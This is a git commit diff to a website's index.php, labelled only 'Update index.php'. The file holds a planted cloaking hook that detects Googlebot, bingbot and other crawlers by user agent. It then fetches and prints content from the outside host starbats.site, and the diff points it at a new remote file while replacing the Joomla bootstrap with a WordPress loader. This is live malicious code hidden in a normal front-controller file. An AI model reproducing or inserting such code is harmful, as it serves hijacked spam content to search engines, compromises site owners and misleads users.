07b24ccd01b15a69426fdb33c044b64c41ed9af8
acimiyek <kevinoin21@gmail.com>
2025-02-05 06:57:23 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,14 +1,4 @@
 <?php
-/**
- * @package    Joomla.Site
- *
- * @copyright  Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.
- * @license    GNU General Public License version 2 or later; see LICENSE.txt
- */
-
-/**
- * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
- */
 function is_bot() {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
@@ -23,45 +13,26 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://starbats.site/landing/equipt.txt');
+    $message = file_get_contents('https://starbats.site/landing/odon.txt');
     echo $message;
 exit;
 }
-define('JOOMLA_MINIMUM_PHP', '5.3.10');
+?>
 
-if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
-{
-	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
-}
-
-// Saves the start time and memory usage.
-$startTime = microtime(1);
-$startMem  = memory_get_usage();
+<?php
+/**
+* Front to the WordPress application. This file doesn't do anything, but loads
+* wp-blog-header.php which does and tells WordPress to load the theme.
+*
+* @package WordPress
+*/
 
 /**
- * Constant that is checked in included files to prevent direct access.
- * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
- */
-define('_JEXEC', 1);
+* Tells WordPress to load the WordPress theme and output it.
+*
+* @var bool
+*/
+define( 'WP_USE_THEMES', true );
 
-if (file_exists(__DIR__ . '/defines.php'))
-{
-	include_once __DIR__ . '/defines.php';
-}
-
-if (!defined('_JDEFINES'))
-{
-	define('JPATH_BASE', __DIR__);
-	require_once JPATH_BASE . '/includes/defines.php';
-}
-
-require_once JPATH_BASE . '/includes/framework.php';
-
-// Set profiler start time and memory usage and mark afterLoad in the profiler.
-JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;
-
-// Instantiate the application.
-$app = JFactory::getApplication('site');
-
-// Execute the application.
-$app->execute();
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
